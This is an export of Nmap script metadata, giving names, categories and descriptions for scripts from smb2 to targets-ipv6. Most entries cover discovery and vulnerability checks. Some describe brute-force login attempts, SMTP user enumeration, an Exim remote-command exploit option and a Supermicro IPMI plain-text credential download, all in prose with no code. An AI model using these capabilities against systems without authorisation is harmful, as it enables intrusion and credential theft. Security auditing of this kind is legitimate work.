<description>Attempts to list the supported capabilities in a SMBv2 server for each&#xa; enabled dialect.&#xa;&#xa;The script sends a SMB2_COM_NEGOTIATE command and parses the response&#xa; using the SMB dialects:&#xa;* 2.0.2&#xa;* 2.1&#xa;* 3.0&#xa;* 3.0.2&#xa;* 3.1.1&#xa;&#xa;References:&#xa;* https://msdn.microsoft.com/en-us/library/cc246561.aspx&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb2-security-mode.nse">
<categories><category>safe</category><category>discovery</category><category>default</category></categories>
<description>Determines the message signing configuration in SMBv2 servers&#xa; for all supported dialects.&#xa;&#xa;The script sends a SMB2_COM_NEGOTIATE request for each SMB2/SMB3 dialect&#xa; and parses the security mode field to determine the message signing&#xa; configuration of the SMB server.&#xa;&#xa;References:&#xa;* https://msdn.microsoft.com/en-us/library/cc246561.aspx&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb2-time.nse">
<categories><category>discovery</category><category>safe</category><category>default</category></categories>
<description>Attempts to obtain the current system date and the start date of a SMB2 server.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb2-vuln-uptime.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Attempts to detect missing patches in Windows systems by checking the&#xa;uptime returned during the SMB2 protocol negotiation.&#xa;&#xa;SMB2 protocol negotiation response returns the system boot time&#xa; pre-authentication. This information can be used to determine&#xa; if a system is missing critical patches without triggering IDS/IPS/AVs.&#xa;&#xa;Remember that a rebooted system may still be vulnerable. This check&#xa;only reveals unpatched systems based on the uptime, no additional probes are sent.&#xa;&#xa;References:&#xa;* https://twitter.com/breakersall/status/880496571581857793&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smtp-brute.nse">
<categories><category>brute</category><category>intrusive</category></categories>
<description>Performs brute force password auditing against SMTP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smtp-commands.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to use EHLO and HELP to gather the Extended commands supported by an&#xa;SMTP server.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smtp-enum-users.nse">
<categories><category>auth</category><category>external</category><category>intrusive</category></categories>
<description>Attempts to enumerate the users on a SMTP server by issuing the VRFY, EXPN or RCPT TO&#xa;commands. The goal of this script is to discover all the user accounts in the remote&#xa;system.&#xa;&#xa;The script will output the list of user names that were found. The script will stop&#xa;querying the SMTP server if authentication is enforced. If an error occurs while testing&#xa;the target host, the error will be printed with the list of any combinations that were&#xa;found prior to the error.&#xa;&#xa;The user can specify which methods to use and in which order. The script will ignore&#xa;repeated methods. If not specified the script will use the RCPT first, then VRFY and EXPN.&#xa;An example of how to specify the methods to use and the order is the following:&#xa;&#xa;&lt;code&gt;smtp-enum-users.methods={EXPN,RCPT,VRFY}&lt;/code&gt;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smtp-ntlm-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>This script enumerates information from remote SMTP services with NTLM&#xa;authentication enabled.&#xa;&#xa;Sending a SMTP NTLM authentication request with null credentials will&#xa;cause the remote service to respond with a NTLMSSP message disclosing&#xa;information to include NetBIOS, DNS, and OS build version.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smtp-open-relay.nse">
<categories><category>discovery</category><category>intrusive</category><category>external</category></categories>
<description>Attempts to relay mail by issuing a predefined combination of SMTP commands. The goal&#xa;of this script is to tell if a SMTP server is vulnerable to mail relaying.&#xa;&#xa;An SMTP server that works as an open relay, is a email server that does not verify if the&#xa;user is authorised to send email from the specified email address. Therefore, users would&#xa;be able to send email originating from any third-party email address that they want.&#xa;&#xa;The checks are done based in combinations of MAIL FROM and RCPT TO commands. The list is&#xa;hardcoded in the source file. The script will output all the working combinations that the&#xa;server allows if nmap is in verbose mode otherwise the script will print the number of&#xa;successful tests. The script will not output if the server requires authentication.&#xa;&#xa;If debug is enabled and an error occurs while testing the target host, the error will be&#xa;printed with the list of any combinations that were found prior to the error.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smtp-strangeport.nse">
<categories><category>malware</category><category>safe</category></categories>
<description>Checks if SMTP is running on a non-standard port.&#xa;&#xa;This may indicate that crackers or script kiddies have set up a backdoor on the&#xa;system to send spam or control the machine.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smtp-vuln-cve2010-4344.nse">
<categories><category>exploit</category><category>intrusive</category><category>vuln</category></categories>
<description>Checks for and/or exploits a heap overflow within versions of Exim&#xa;prior to version 4.69 (CVE-2010-4344) and a privilege escalation&#xa;vulnerability in Exim 4.72 and prior (CVE-2010-4345).&#xa;&#xa;The heap overflow vulnerability allows remote attackers to execute&#xa;arbitrary code with the privileges of the Exim daemon&#xa;(CVE-2010-4344). If the exploit fails then the Exim smtpd child will&#xa;be killed (heap corruption).&#xa;&#xa;The script also checks for a privilege escalation vulnerability that&#xa;affects Exim version 4.72 and prior. The vulnerability allows the exim&#xa;user to gain root privileges by specifying an alternate configuration&#xa;file using the -C option (CVE-2010-4345).&#xa;&#xa;The &lt;code&gt;smtp-vuln-cve2010-4344.exploit&lt;/code&gt; script argument will make&#xa;the script try to exploit the vulnerabilities, by sending more than 50MB of&#xa;data, it depends on the message size limit configuration option of the&#xa;Exim server. If the exploit succeed the &lt;code&gt;exploit.cmd&lt;/code&gt; or&#xa;&lt;code&gt;smtp-vuln-cve2010-4344.cmd&lt;/code&gt; script arguments can be used to&#xa;run an arbitrary command on the remote system, under the&#xa;&lt;code&gt;Exim&lt;/code&gt; user privileges. If this script argument is set then it&#xa;will enable the &lt;code&gt;smtp-vuln-cve2010-4344.exploit&lt;/code&gt; argument.&#xa;&#xa;To get the appropriate debug messages for this script, please use -d2.&#xa;&#xa;Some of the logic of this script is based on the metasploit&#xa;exim4_string_format exploit.&#xa;* http://www.metasploit.com/modules/exploit/unix/smtp/exim4_string_format&#xa;&#xa;Reference:&#xa;* http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-4344&#xa;* http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-4345&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smtp-vuln-cve2011-1720.nse">
<categories><category>intrusive</category><category>vuln</category></categories>
<description>Checks for a memory corruption in the Postfix SMTP server when it uses&#xa;Cyrus SASL library authentication mechanisms (CVE-2011-1720).  This&#xa;vulnerability can allow denial of service and possibly remote code&#xa;execution.&#xa;&#xa;Reference:&#xa;* http://www.postfix.org/CVE-2011-1720.html&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smtp-vuln-cve2011-1764.nse">
<categories><category>intrusive</category><category>vuln</category></categories>
<description>Checks for a format string vulnerability in the Exim SMTP server&#xa;(version 4.70 through 4.75) with DomainKeys Identified Mail (DKIM) support&#xa;(CVE-2011-1764).  The DKIM logging mechanism did not use format string&#xa;specifiers when logging some parts of the DKIM-Signature header field.&#xa;A remote attacker who is able to send emails, can exploit this vulnerability&#xa;and execute arbitrary code with the privileges of the Exim daemon.&#xa;&#xa;Reference:&#xa;* http://bugs.exim.org/show_bug.cgi?id=1106&#xa;* http://thread.gmane.org/gmane.mail.exim.devel/4946&#xa;* https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2011-1764&#xa;* http://en.wikipedia.org/wiki/DomainKeys_Identified_Mail&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\sniffer-detect.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Checks if a target on a local Ethernet has its network card in promiscuous mode.&#xa;&#xa;The techniques used are described at&#xa;http://www.securityfriday.com/promiscuous_detection_01.pdf.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\snmp-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Attempts to find an SNMP community string by brute force guessing.&#xa;&#xa;This script opens a sending socket and a sniffing pcap socket in parallel&#xa;threads. The sending socket sends the SNMP probes with the community strings,&#xa;while the pcap socket sniffs the network for an answer to the probes. If&#xa;valid community strings are found, they are added to the creds database and&#xa;reported in the output.&#xa;&#xa;The script takes the &lt;code&gt;snmp-brute.communitiesdb&lt;/code&gt; argument that&#xa;allows the user to define the file that contains the community strings to&#xa;be used. If not defined, the default wordlist used to bruteforce the SNMP&#xa;community strings is &lt;code&gt;nselib/data/snmpcommunities.lst&lt;/code&gt;. In case&#xa;this wordlist does not exist, the script falls back to&#xa;&lt;code&gt;nselib/data/passwords.lst&lt;/code&gt;&#xa;&#xa;No output is reported if no valid account is found.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\snmp-hh3c-logins.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to enumerate Huawei / HP/H3C Locally Defined Users through the&#xa;hh3c-user.mib OID&#xa;&#xa;For devices running software released pre-Oct 2012 only an SNMP read-only&#xa;string is required to access the OID. Otherwise a read-write string is&#xa;required.&#xa;&#xa;Output is &apos;username - password - level: {0|1|2|3}&apos;&#xa;&#xa;Password may be in cleartext, ciphertext or sha256&#xa;Levels are from 0 to 3 with 0 being the lowest security level&#xa;&#xa;https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03515685&#xa;http://grutztopia.jingojango.net/2012/10/hph3c-and-huawei-snmp-weak-access-to.html&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\snmp-info.nse">
<categories><category>default</category><category>version</category><category>safe</category></categories>
<description>Extracts basic information from an SNMPv3 GET request. The same probe is used&#xa;here as in the service version detection scan.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\snmp-interfaces.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to enumerate network interfaces through SNMP.&#xa;&#xa;This script can also be run during Nmap&apos;s pre-scanning phase and can&#xa;attempt to add the SNMP server&apos;s interface addresses to the target&#xa;list.  The script argument &lt;code&gt;snmp-interfaces.host&lt;/code&gt; is&#xa;required to know what host to probe.  To specify a port for the SNMP&#xa;server other than 161, use &lt;code&gt;snmp-interfaces.port&lt;/code&gt;.  When&#xa;run in this way, the script&apos;s output tells how many new targets were&#xa;successfully added.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\snmp-ios-config.nse">
<categories><category>intrusive</category></categories>
<description>Attempts to downloads Cisco router IOS configuration files using SNMP RW (v1) and display or save them.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\snmp-netstat.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to query SNMP for a netstat like output. The script can be used to&#xa;identify and automatically add new targets to the scan by supplying the&#xa;newtargets script argument.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\snmp-processes.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to enumerate running processes through SNMP.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\snmp-sysdescr.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to extract system information from an SNMP service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\snmp-win32-services.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to enumerate Windows services through SNMP.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\snmp-win32-shares.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to enumerate Windows Shares through SNMP.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\snmp-win32-software.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to enumerate installed software through SNMP.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\snmp-win32-users.nse">
<categories><category>default</category><category>auth</category><category>safe</category></categories>
<description>Attempts to enumerate Windows user accounts through SNMP&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\socks-auth-info.nse">
<categories><category>discovery</category><category>safe</category><category>default</category></categories>
<description>Determines the supported authentication mechanisms of a remote SOCKS&#xa;proxy server.  Starting with SOCKS version 5 socks servers may support&#xa;authentication.  The script checks for the following authentication&#xa;types:&#xa;  0 - No authentication&#xa;  1 - GSSAPI&#xa;  2 - Username and password&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\socks-brute.nse">
<categories><category>brute</category><category>intrusive</category></categories>
<description>Performs brute force password auditing against SOCKS 5 proxy servers.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\socks-open-proxy.nse">
<categories><category>default</category><category>discovery</category><category>external</category><category>safe</category></categories>
<description>Checks if an open socks proxy is running on the target.&#xa;&#xa;The script attempts to connect to a proxy server and send socks4 and&#xa;socks5 payloads. It is considered an open proxy if the script receives&#xa;a Request Granted response from the target port.&#xa;&#xa;The payloads try to open a connection to www.google.com port 80.  A&#xa;different test host can be passed as &lt;code&gt;proxy.url&lt;/code&gt;&#xa;argument.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ssh-auth-methods.nse">
<categories><category>auth</category><category>intrusive</category></categories>
<description>Returns authentication methods that a SSH server supports.&#xa;&#xa;This is in the &quot;intrusive&quot; category because it starts an authentication with a&#xa;username which may be invalid. The abandoned connection will likely be logged.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ssh-brute.nse">
<categories><category>brute</category><category>intrusive</category></categories>
<description>Performs brute-force password guessing against ssh servers.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ssh-hostkey.nse">
<categories><category>safe</category><category>default</category><category>discovery</category></categories>
<description>Shows SSH hostkeys.&#xa;&#xa;Shows the target SSH server&apos;s key fingerprint and (with high enough&#xa;verbosity level) the public key itself.  It records the discovered host keys&#xa;in &lt;code&gt;nmap.registry&lt;/code&gt; for use by other scripts.  Output can be&#xa;controlled with the &lt;code&gt;ssh_hostkey&lt;/code&gt; script argument.&#xa;&#xa;You may also compare the retrieved key with the keys in your known-hosts&#xa;file using the &lt;code&gt;known-hosts&lt;/code&gt; argument.&#xa;&#xa;The script also includes a postrule that check for duplicate hosts using the&#xa;gathered keys.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ssh-publickey-acceptance.nse">
<categories><category>auth</category><category>intrusive</category></categories>
<description>This script takes a table of paths to private keys, passphrases, and usernames&#xa;and checks each pair to see if the target ssh server accepts them for publickey&#xa;authentication. If no keys are given or the known-bad option is given, the&#xa;script will check if a list of known static public keys are accepted for&#xa;authentication.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ssh-run.nse">
<categories><category>intrusive</category></categories>
<description>Runs remote command on ssh server and returns command output.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ssh2-enum-algos.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Reports the number of algorithms (for encryption, compression, etc.) that&#xa;the target SSH2 server offers. If verbosity is set, the offered algorithms&#xa;are each listed by type.&#xa;&#xa;If the &quot;client to server&quot; and &quot;server to client&quot; algorithm lists are identical&#xa;(order specifies preference) then the list is shown only once under a combined&#xa;type.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\sshv1.nse">
<categories><category>default</category><category>safe</category></categories>
<description>Checks if an SSH server supports the obsolete and less secure SSH Protocol Version 1.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ssl-ccs-injection.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Detects whether a server is vulnerable to the SSL/TLS &quot;CCS Injection&quot;&#xa;vulnerability (CVE-2014-0224), first discovered by Masashi Kikuchi.&#xa;The script is based on the ccsinjection.c code authored by Ramon de C Valle&#xa;(https://gist.github.com/rcvalle/71f4b027d61a78c42607)&#xa;&#xa;In order to exploit the vulnerablity, a MITM attacker would effectively&#xa;do the following:&#xa;&#xa;    o Wait for a new TLS connection, followed by the ClientHello&#xa;      ServerHello handshake messages.&#xa;&#xa;    o Issue a CCS packet in both the directions, which causes the OpenSSL&#xa;      code to use a zero length pre master secret key. The packet is sent&#xa;      to both ends of the connection. Session Keys are derived using a&#xa;      zero length pre master secret key, and future session keys also&#xa;      share this weakness.&#xa;&#xa;    o Renegotiate the handshake parameters.&#xa;&#xa;    o The attacker is now able to decrypt or even modify the packets&#xa;      in transit.&#xa;&#xa;The script works by sending a &apos;ChangeCipherSpec&apos; message out of order and&#xa;checking whether the server returns an &apos;UNEXPECTED_MESSAGE&apos; alert record&#xa;or not. Since a non-patched server would simply accept this message, the&#xa;CCS packet is sent twice, in order to force an alert from the server. If&#xa;the alert type is different than &apos;UNEXPECTED_MESSAGE&apos;, we can conclude&#xa;the server is vulnerable.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ssl-cert-intaddr.nse">
<categories><category>vuln</category><category>discovery</category><category>safe</category></categories>
<description>Reports any private (RFC1918) IPv4 addresses found in the various fields of&#xa;an SSL service&apos;s certificate.  These will only be reported if the target&#xa;address itself is not private.  Nmap v7.30 or later is required.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ssl-cert.nse">
<categories><category>default</category><category>safe</category><category>discovery</category></categories>
<description>Retrieves a server&apos;s SSL certificate. The amount of information printed&#xa;about the certificate depends on the verbosity level. With no extra&#xa;verbosity, the script prints the validity period and the commonName,&#xa;organizationName, stateOrProvinceName, and countryName of the subject.&#xa;&#xa;&lt;code&gt;&#xa;443/tcp open  https&#xa;| ssl-cert: Subject: commonName=www.paypal.com/organizationName=PayPal, Inc.\&#xa;/stateOrProvinceName=California/countryName=US&#xa;| Not valid before: 2011-03-23 00:00:00&#xa;|_Not valid after:  2013-04-01 23:59:59&#xa;&lt;/code&gt;&#xa;&#xa;With &lt;code&gt;-v&lt;/code&gt; it adds the issuer name and fingerprints.&#xa;&#xa;&lt;code&gt;&#xa;443/tcp open  https&#xa;| ssl-cert: Subject: commonName=www.paypal.com/organizationName=PayPal, Inc.\&#xa;/stateOrProvinceName=California/countryName=US&#xa;| Issuer: commonName=VeriSign Class 3 Extended Validation SSL CA\&#xa;/organizationName=VeriSign, Inc./countryName=US&#xa;| Public Key type: rsa&#xa;| Public Key bits: 2048&#xa;| Signature Algorithm: sha1WithRSAEncryption&#xa;| Not valid before: 2011-03-23 00:00:00&#xa;| Not valid after:  2013-04-01 23:59:59&#xa;| MD5:   bf47 ceca d861 efa7 7d14 88ad 4a73 cb5b&#xa;|_SHA-1: d846 5221 467a 0d15 3df0 9f2e af6d 4390 0213 9a68&#xa;&lt;/code&gt;&#xa;&#xa;With &lt;code&gt;-vv&lt;/code&gt; it adds the PEM-encoded contents of the entire&#xa;certificate.&#xa;&#xa;&lt;code&gt;&#xa;443/tcp open  https&#xa;| ssl-cert: Subject: commonName=www.paypal.com/organizationName=PayPal, Inc.\&#xa;/stateOrProvinceName=California/countryName=US/1.3.6.1.4.1.311.60.2.1.2=Delaware\&#xa;/postalCode=95131-2021/localityName=San Jose/serialNumber=3014267\&#xa;/streetAddress=2211 N 1st St/1.3.6.1.4.1.311.60.2.1.3=US\&#xa;/organizationalUnitName=PayPal Production/businessCategory=Private Organization&#xa;| Issuer: commonName=VeriSign Class 3 Extended Validation SSL CA\&#xa;/organizationName=VeriSign, Inc./countryName=US\&#xa;/organizationalUnitName=Terms of use at https://www.verisign.com/rpa (c)06&#xa;| Public Key type: rsa&#xa;| Public Key bits: 2048&#xa;| Signature Algorithm: sha1WithRSAEncryption&#xa;| Not valid before: 2011-03-23 00:00:00&#xa;| Not valid after:  2013-04-01 23:59:59&#xa;| MD5:   bf47 ceca d861 efa7 7d14 88ad 4a73 cb5b&#xa;| SHA-1: d846 5221 467a 0d15 3df0 9f2e af6d 4390 0213 9a68&#xa;| -&#45;&#45;&#45;&#45;BEGIN CERTIFICATE-&#45;&#45;&#45;&#45;&#xa;| MIIGSzCCBTOgAwIBAgIQLjOHT2/i1B7T//819qTJGDANBgkqhkiG9w0BAQUFADCB&#xa;...&#xa;| 9YDR12XLZeQjO1uiunCsJkDIf9/5Mqpu57pw8v1QNA==&#xa;|_-&#45;&#45;&#45;&#45;END CERTIFICATE-&#45;&#45;&#45;&#45;&#xa;&lt;/code&gt;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ssl-date.nse">
<categories><category>discovery</category><category>safe</category><category>default</category></categories>
<description>Retrieves a target host&apos;s time and date from its TLS ServerHello response.&#xa;&#xa;&#xa;In many TLS implementations, the first four bytes of server randomness&#xa;are a Unix timestamp. The script will test whether this is indeed true&#xa;and report the time only if it passes this test.&#xa;&#xa;Original idea by Jacob Appelbaum and his TeaTime and tlsdate tools:&#xa;* https://github.com/ioerror/TeaTime&#xa;* https://github.com/ioerror/tlsdate&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ssl-dh-params.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Weak ephemeral Diffie-Hellman parameter detection for SSL/TLS services.&#xa;&#xa;This script simulates SSL/TLS handshakes using ciphersuites that have ephemeral&#xa;Diffie-Hellman as the key exchange algorithm.&#xa;&#xa;Diffie-Hellman MODP group parameters are extracted and analyzed for vulnerability&#xa;to Logjam (CVE 2015-4000) and other weaknesses.&#xa;&#xa;Opportunistic STARTTLS sessions are established on services that support them.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ssl-enum-ciphers.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>This script repeatedly initiates SSLv3/TLS connections, each time trying a new&#xa;cipher or compressor while recording whether a host accepts or rejects it. The&#xa;end result is a list of all the ciphersuites and compressors that a server accepts.&#xa;&#xa;Each ciphersuite is shown with a letter grade (A through F) indicating the&#xa;strength of the connection. The grade is based on the cryptographic strength of&#xa;the key exchange and of the stream cipher. The message integrity (hash)&#xa;algorithm choice is not a factor.  The output line beginning with&#xa;&lt;code&gt;Least strength&lt;/code&gt; shows the strength of the weakest cipher offered.&#xa;The scoring is based on the Qualys SSL Labs SSL Server Rating Guide, but does&#xa;not take protocol support (TLS version) into account, which makes up 30% of the&#xa;SSL Labs rating.&#xa;&#xa;SSLv3/TLSv1 requires more effort to determine which ciphers and compression&#xa;methods a server supports than SSLv2. A client lists the ciphers and compressors&#xa;that it is capable of supporting, and the server will respond with a single&#xa;cipher and compressor chosen, or a rejection notice.&#xa;&#xa;Some servers use the client&apos;s ciphersuite ordering: they choose the first of&#xa;the client&apos;s offered suites that they also support. Other servers prefer their&#xa;own ordering: they choose their most preferred suite from among those the&#xa;client offers. In the case of server ordering, the script makes extra probes to&#xa;discover the server&apos;s sorted preference list. Otherwise, the list is sorted&#xa;alphabetically.&#xa;&#xa;The script will warn about certain SSL misconfigurations such as MD5-signed&#xa;certificates, low-quality ephemeral DH parameters, and the POODLE&#xa;vulnerability.&#xa;&#xa;This script is intrusive since it must initiate many connections to a server,&#xa;and therefore is quite noisy.&#xa;&#xa;It is recommended to use this script in conjunction with version detection&#xa;(&lt;code&gt;-sV&lt;/code&gt;) in order to discover SSL/TLS services running on unexpected&#xa;ports. For the most common SSL ports like 443, 25 (with STARTTLS), 3389, etc.&#xa;the script is smart enough to run on its own.&#xa;&#xa;References:&#xa;* Qualys SSL Labs Rating Guide - https://www.ssllabs.com/projects/rating-guide/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ssl-heartbleed.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Detects whether a server is vulnerable to the OpenSSL Heartbleed bug (CVE-2014-0160).&#xa;The code is based on the Python script ssltest.py authored by Katie Stafford (katie@ktpanda.org)&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ssl-known-key.nse">
<categories><category>safe</category><category>discovery</category><category>vuln</category><category>default</category></categories>
<description>Checks whether the SSL certificate used by a host has a fingerprint&#xa;that matches an included database of problematic keys.&#xa;&#xa;The only databases currently checked are the LittleBlackBox 0.1 database of&#xa;compromised keys from various devices, some keys reportedly used by the Chinese&#xa;state-sponsored hacking division APT1&#xa;(https://www.fireeye.com/blog/threat-research/2013/03/md5-sha1.html),&#xa;and the key used by CARBANAK malware&#xa;(https://www.fireeye.com/blog/threat-research/2017/06/behind-the-carbanak-backdoor.html).&#xa;However, any file of fingerprints will serve just as well. For example, this&#xa;could be used to find weak Debian OpenSSL keys using the widely available (but&#xa;too large to include with Nmap) list.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ssl-poodle.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Checks whether SSLv3 CBC ciphers are allowed (POODLE)&#xa;&#xa;Run with -sV to use Nmap&apos;s service scan to detect SSL/TLS on non-standard&#xa;ports. Otherwise, ssl-poodle will only run on ports that are commonly used for&#xa;SSL.&#xa;&#xa;POODLE is CVE-2014-3566. All implementations of SSLv3 that accept CBC&#xa;ciphersuites are vulnerable. For speed of detection, this script will stop&#xa;after the first CBC ciphersuite is discovered. If you want to enumerate all CBC&#xa;ciphersuites, you can use Nmap&apos;s own ssl-enum-ciphers to do a full audit of&#xa;your TLS ciphersuites.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\sslv2-drown.nse">
<categories><category>intrusive</category><category>vuln</category></categories>
<description>Determines whether the server supports SSLv2, what ciphers it supports and tests for&#xa;CVE-2015-3197, CVE-2016-0703 and CVE-2016-0800 (DROWN)&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\sslv2.nse">
<categories><category>default</category><category>safe</category></categories>
<description>Determines whether the server supports obsolete and less secure SSLv2, and discovers which ciphers it&#xa;supports.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\sstp-discover.nse">
<categories><category>discovery</category><category>default</category><category>safe</category></categories>
<description>Check if the Secure Socket Tunneling Protocol is supported. This is&#xa;accomplished by trying to establish the HTTPS layer which is used to&#xa;carry SSTP traffic as described in:&#xa;    - http://msdn.microsoft.com/en-us/library/cc247364.aspx&#xa;&#xa;Current SSTP server implementations:&#xa;    - Microsoft Windows (Server 2008/Server 2012)&#xa;    - MikroTik RouterOS&#xa;    - SEIL (http://www.seil.jp)&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\stun-info.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Retrieves the external IP address of a NAT:ed host using the STUN protocol.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\stun-version.nse">
<categories><category>version</category></categories>
<description>Sends a binding request to the server and attempts to extract version&#xa;information from the response, if the server attribute is present.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\stuxnet-detect.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Detects whether a host is infected with the Stuxnet worm (http://en.wikipedia.org/wiki/Stuxnet).&#xa;&#xa;An executable version of the Stuxnet infection will be downloaded if a format&#xa;for the filename is given on the command line.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\supermicro-ipmi-conf.nse">
<categories><category>exploit</category><category>vuln</category></categories>
<description>Attempts to download an unprotected configuration file containing plain-text&#xa;user credentials in vulnerable Supermicro Onboard IPMI controllers.&#xa;&#xa;The script connects to port 49152 and issues a request for &quot;/PSBlock&quot; to&#xa;download the file. This configuration file contains users with their passwords&#xa;in plain text.&#xa;&#xa;References:&#xa;* http://blog.cari.net/carisirt-yet-another-bmc-vulnerability-and-some-added-extras/&#xa;* https://community.rapid7.com/community/metasploit/blog/2013/07/02/a-penetration-testers-guide-to-ipmi&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\svn-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against Subversion source code control servers.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\targets-asn.nse">
<categories><category>discovery</category><category>external</category><category>safe</category></categories>
<description>Produces a list of IP prefixes for a given routing AS number (ASN).&#xa;&#xa;This script uses a whois server database operated by the Shadowserver&#xa;Foundation.  We thank them for granting us permission to use this in&#xa;Nmap.&#xa;&#xa;Output is in CIDR notation.&#xa;&#xa;http://www.shadowserver.org/wiki/pmwiki.php/Services/IP-BGP&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\targets-ipv6-map4to6.nse">
<categories><category>discovery</category></categories>
<description>This script runs in the pre-scanning phase to map IPv4 addresses onto IPv6&#xa;networks and add them to the scan queue.&#xa;&#xa;The technique is more general than what is technically termed &quot;IPv4-mapped IPv6&#xa;addresses.&quot; The lower 4 bytes of the IPv6 network address are replaced with the&#xa;4 bytes of IPv4 address. When the IPv6 network is ::ffff:0:0/96, then the&#xa;script generates IPv4-mapped IPv6 addresses. When the network is ::/96, then it&#xa;generates IPv4-compatible IPv6 addresses.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\targets-ipv6-multicast-echo.nse">
<categories><category>discovery</category><category>broadcast</category></categories>
<description>Sends an ICMPv6 echo request packet to the all-nodes link-local&#xa;multicast address (&lt;code&gt;ff02::1&lt;/code&gt;) to discover responsive hosts&#xa;on a LAN without needing to individually ping each IPv6 address.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\targets-ipv6-multicast-invalid-dst.nse">
<categories><category>discovery</category><category>broadcast</category></categories>
<description>Sends an ICMPv6 packet with an invalid extension header to the&#xa;all-nodes link-local multicast address (&lt;code&gt;ff02::1&lt;/code&gt;) to&#xa;discover (some) available hosts on the LAN. This works because some&#xa;hosts will respond to this probe with an ICMPv6 Parameter Problem&#xa;packet.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\targets-ipv6-multicast-mld.nse">
<categories><category>discovery</category><category>broadcast</category></categories>
<description>Attempts to discover available IPv6 hosts on the LAN by sending an MLD&#xa;(multicast listener discovery) query to the link-local multicast address&#xa;(ff02::1) and listening for any responses.  The query&apos;s maximum response delay&#xa;set to 1 to provoke hosts to respond immediately rather than waiting for other&#xa;responses from their multicast group.&#xa;</description>
</script>
